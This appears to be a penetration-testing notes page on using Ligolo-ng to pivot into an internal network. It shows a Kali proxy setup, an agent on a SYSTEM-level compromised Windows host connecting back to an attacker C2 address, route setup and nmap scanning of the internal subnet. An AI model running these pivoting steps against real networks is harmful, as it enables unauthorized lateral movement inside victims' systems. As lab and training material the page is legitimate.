---
description: An advanced, yet simple, tunneling tool that uses TUN interfaces.
---

# Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

## Starting Ligolo

You should transfer an agent client to your target machine.&#x20;

### Setting up a NIC

When using Linux, you need to create a tun interface on the Proxy Server (C2):

{% code overflow="wrap" %}
```bash
#sudo ip tuntap add user [your_username] mode tun ligolo
#sudo ip link set ligolo up

Kali> sudo ip tuntap add user iptracej mode tun ligolo
Kali> sudo ip link set ligolo up
Kali> ifconfig
```
{% endcode %}

### Starting a Proxy

```bash
# ./proxy -h # Help options 
Kali> proxy -selfcert
```

### Staring an Agent

{% code overflow="wrap" %}
```bash
# $ ./agent -connect attacker_c2_server.com:11601 
CMD> .\agent.exe -connect 172.16.11.11:11601 -retry -ignore-cert
```
{% endcode %}

### Proxy Operation

{% code overflow="wrap" %}
```bash
# INFO[0102] Agent joined.  name="NT AUTHORITY\\SYSTEM@MS01" remote="192.168.100.2:49719"
```
{% endcode %}

Use 'session' command to select the agent. You can select a sessin number here.&#x20;

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">#ligolo-ng » <a data-footnote-ref href="#user-content-fn-1">session</a> 
#? Specify a session : 1 - NT AUTHORITY\SYSTEM@MS01 - 192.168.100.2:49719
</code></pre>

Use 'ipconfig' command to select the agent.&#x20;

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">#[Agent : NT AUTHORITY\SYSTEM@MS01] » <a data-footnote-ref href="#user-content-fn-1">ifconfig </a>
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ 00:0c:29:3c:a0:bb              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 192.168.100.2/24               │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:0c:29:3c:a0:c5              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 10.10.1.2/24                   │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
</code></pre>

### Add an route to your target network

{% code overflow="wrap" %}
```bash
Kali> sudo ip route add 10.10.1.0/24 dev ligolo
Kali> ip route

# Remove the route
# Kali> sudo ip route del 10.10.1.0/24 dev ligolo
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### Start tunnel&#x20;

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">#[Agent : NT AUTHORITY\SYSTEM@MS01] » <a data-footnote-ref href="#user-content-fn-1">tunnel_start</a>
#[Agent : NT AUTHORITY\SYSTEM@MS01] » INFO[1113] Starting tunnel to NT AUTHORITY\SYSTEM@MS01
</code></pre>

### Kali Commands

```bash
ping -c 2 <internal machine>
nmap -sC -sv <internal machine> 
... 
```

[^1]: 
